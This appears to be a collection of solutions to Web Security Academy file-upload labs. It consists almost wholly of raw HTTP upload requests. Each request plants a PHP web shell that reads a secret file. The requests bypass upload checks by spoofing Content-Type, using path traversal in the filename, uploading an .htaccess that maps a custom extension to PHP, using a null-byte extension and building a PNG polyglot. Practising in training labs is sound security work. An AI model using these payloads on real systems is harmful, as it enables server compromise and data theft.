## 1. Remote code execution via web shell upload

```
POST /my-account/avatar HTTP/2
Host: 0a2a000d034b3a5780be90c6006100a4.web-security-academy.net
Cookie: session=c1kKE6VfKOuRSYXfIiWblDekcr94Gk5P
Content-Length: 460
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a2a000d034b3a5780be90c6006100a4.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryo9RcZN4QtSz1lVuV
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a2a000d034b3a5780be90c6006100a4.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryo9RcZN4QtSz1lVuV
Content-Disposition: form-data; name="avatar"; filename="logo_3.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryo9RcZN4QtSz1lVuV
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryo9RcZN4QtSz1lVuV
Content-Disposition: form-data; name="csrf"

uvi1ibBncQEdfVL9iTXMpumRd3FvOzQG
------WebKitFormBoundaryo9RcZN4QtSz1lVuV--

```

## 2. Web shell upload via Content-Type restriction bypass

```
POST /my-account/avatar HTTP/2
Host: 0a6f0062033d0d4f86d8eb3a00490099.web-security-academy.net
Cookie: session=wVCKjRXlPHAkbLGmnE6sjc1oFktH9oZD
Content-Length: 460
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a6f0062033d0d4f86d8eb3a00490099.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryN53t54EuqbwspDuF
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a6f0062033d0d4f86d8eb3a00490099.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryN53t54EuqbwspDuF
Content-Disposition: form-data; name="avatar"; filename="logo_3.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryN53t54EuqbwspDuF
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryN53t54EuqbwspDuF
Content-Disposition: form-data; name="csrf"

4QXDTZZ964IE2wNFCwZgCr75vpW9dV8W
------WebKitFormBoundaryN53t54EuqbwspDuF--

```


## 3. Web shell upload via path traversal

```
POST /my-account/avatar HTTP/2
Host: 0afb005b041e73d9850c598400660029.web-security-academy.net
Cookie: session=EXsiPZjf5YbJOdRKjuD0Q4btCnUdalpv
Content-Length: 461
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0afb005b041e73d9850c598400660029.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYjviDTGKjZnr01JZ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afb005b041e73d9850c598400660029.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryYjviDTGKjZnr01JZ
Content-Disposition: form-data; name="avatar"; filename="..%2ffb.php"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryYjviDTGKjZnr01JZ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryYjviDTGKjZnr01JZ
Content-Disposition: form-data; name="csrf"

6RUIJpx53yU4xZPI7hgv2ysV7z7pG2ZO
------WebKitFormBoundaryYjviDTGKjZnr01JZ--

```

## 4. Web shell upload via extension blacklist bypass

```
POST /my-account/avatar HTTP/2
Host: 0a63002704bf6e4480604eda00d100fc.web-security-academy.net
Cookie: session=Q92BmVdTgeAhMIr43kolmLmdrMOm4XEL
Content-Length: 441
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a63002704bf6e4480604eda00d100fc.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoOT5S5XATjxfGAuZ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a63002704bf6e4480604eda00d100fc.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryoOT5S5XATjxfGAuZ
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: image/png

AddType application/x-httpd-php .l33t
------WebKitFormBoundaryoOT5S5XATjxfGAuZ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryoOT5S5XATjxfGAuZ
Content-Disposition: form-data; name="csrf"

kLbfgHtMfBtDOCA5AQIWZuxH1zRNawiD
------WebKitFormBoundaryoOT5S5XATjxfGAuZ--

```


```
POST /my-account/avatar HTTP/2
Host: 0a63002704bf6e4480604eda00d100fc.web-security-academy.net
Cookie: session=Q92BmVdTgeAhMIr43kolmLmdrMOm4XEL
Content-Length: 462
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a63002704bf6e4480604eda00d100fc.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoOT5S5XATjxfGAuZ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a63002704bf6e4480604eda00d100fc.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryoOT5S5XATjxfGAuZ
Content-Disposition: form-data; name="avatar"; filename="exploir.l33t"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryoOT5S5XATjxfGAuZ
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryoOT5S5XATjxfGAuZ
Content-Disposition: form-data; name="csrf"

kLbfgHtMfBtDOCA5AQIWZuxH1zRNawiD
------WebKitFormBoundaryoOT5S5XATjxfGAuZ--

```


## 5. Web shell upload via obfuscated file extension

```
POST /my-account/avatar HTTP/2
Host: 0aff00bc03f260cd805862cf008d00fe.web-security-academy.net
Cookie: session=Q0pR0tWqYbj5VbmSzz4BzEmpESE4rxZX
Content-Length: 463
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0aff00bc03f260cd805862cf008d00fe.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary01lfAQx9IByDSclm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aff00bc03f260cd805862cf008d00fe.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundary01lfAQx9IByDSclm
Content-Disposition: form-data; name="avatar"; filename="fb.php%00.png"
Content-Type: image/png

<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary01lfAQx9IByDSclm
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary01lfAQx9IByDSclm
Content-Disposition: form-data; name="csrf"

rpF5unKRZOW78sYbcn5HYWdIo8BLuHNs
------WebKitFormBoundary01lfAQx9IByDSclm--

```


## 6. Remote code execution via polyglot web shell upload

```
POST /my-account/avatar HTTP/2
Host: 0ad300a9038c8e8e835e69e6002700ac.web-security-academy.net
Cookie: session=h9JCqEF3wdklnZVi8sgrcrFGXEreGL3m
Content-Length: 735
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0ad300a9038c8e8e835e69e6002700ac.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoY00TJK9X69oAtHx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ad300a9038c8e8e835e69e6002700ac.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

------WebKitFormBoundaryoY00TJK9X69oAtHx
Content-Disposition: form-data; name="avatar"; filename="fb.php"
Content-Type: image/png


!!!! PNG IMAGE HERE !!!
<?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundaryoY00TJK9X69oAtHx
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryoY00TJK9X69oAtHx
Content-Disposition: form-data; name="csrf"

7dzZirMRsDnbSjVfT2jO9ZJLO4HO2uGQ
------WebKitFormBoundaryoY00TJK9X69oAtHx--

```
